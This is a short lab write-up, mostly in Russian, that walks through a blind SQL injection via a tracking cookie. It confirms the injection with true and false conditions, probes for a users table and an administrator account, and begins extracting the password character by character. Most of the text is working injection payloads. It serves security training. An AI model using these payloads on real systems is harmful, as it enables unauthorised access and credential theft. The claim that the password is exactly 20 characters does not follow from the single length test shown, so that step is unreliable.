Lab 11 - Blind SQL injection with conditional responses

Уязвимый параметр - tracking cookie

End Goals:  
1) Получить пароль администратора  
2) Войти как пользователь administrator

Analysis:

1) Подтвердить, что параметр уязвим к blind SQLi

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN'  
-> Если этот tracking id существует -> запрос возвращает значение -> сообщение "Welcome back"  
-> Если tracking id не существует -> запрос ничего не возвращает -> нет сообщения "Welcome back"

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=1--'  
-> TRUE -> Welcome back

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and 1=0--'  
-> FALSE -> нет Welcome back

2) Подтвердить, что существует таблица users

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'  
-> таблица users существует в базе данных.

3) Подтвердить, что пользователь administrator существует в таблице users

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'  
-> пользователь administrator существует

4) Извлечь пароль пользователя administrator

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'  
-> пароль ровно 20 символов

select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'
